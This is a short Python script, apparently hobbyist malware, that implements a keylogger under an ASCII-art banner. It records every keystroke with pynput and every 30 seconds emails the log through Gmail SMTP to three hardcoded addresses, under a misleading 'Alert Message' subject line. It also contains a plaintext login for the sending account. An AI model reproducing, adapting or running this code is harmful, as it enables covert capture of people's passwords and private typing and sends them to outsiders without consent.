#!usr/bin/env python

import pynput.keyboard
import threading
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders


print ("""
     ____    _   _      _      ____    ____    _   _   _   _  
    |  _ \  | | | |    / \    |  _ \  / ___|  | | | | | \ | | 
    | | | | | |_| |   / _ \   | |_) | \___ \  | | | | |  \| | 
    | |_| | |  _  |  / ___ \  |  _ <   ___) | | |_| | | |\  | 
    |____/  |_| |_| /_/   \_\ |_| \_\ |____/   \___/  |_| \_| 
    
    
    
                                  ______   
	                       .-        -. 
	                      /            \         
	                     |,  .-.  .-.  ,|      
	                     | )(_ /  \_ )( |
	                     |/     /\     \|    
	           (@_       <__    ^^    __>        
	      _     ) \_______\__|IIIIII|__/____________________/\ 
	     (_)\@8@8{}<_________________________________________/ 
	            )_/         \ IIIIII /                    
	           (@            --------                      
		  \n\n""")


log = ""

def process_key_press(key):
    global log
    try:
        log = log + str(key.char)
    except AttributeError:
        if key == key.space:
            log = log + " "
        else:
            log = log + " " + str(key) + " "


def report():
    global log
    mail()
    log = ""
    timer = threading.Timer(30, report)
    timer.start()


def mail():
    mail_content = log

    sender_address = 'authenticationprocess14@gmail.com'
    sender_pass = 'adminsecurity123'
    receiver_address = ["aruncse1420@gmail.com", "ddrish43@gmail.com", "gowthamsurya76@gmail.com"]

    message = MIMEMultipart()
    message['From'] = sender_address
    message['To'] = ",".join(receiver_address)
    message['Subject'] = 'Alert Message of external IP ADDRESS Dedicated'

    message.attach(MIMEText(mail_content, 'plain'))

    part = MIMEBase('application', 'octet-stream')

    part.add_header('Content-Disposition', "attachment; filename = ")

    message.attach(part)
    session = smtplib.SMTP('smtp.gmail.com', 587)
    session.starttls()
    session.login(sender_address, sender_pass)
    text = message.as_string()
    session.sendmail(sender_address, receiver_address, text)
    session.quit()



keyboard_listener = pynput.keyboard.Listener(on_press=process_key_press)
with keyboard_listener:
    report()
    keyboard_listener.join()






































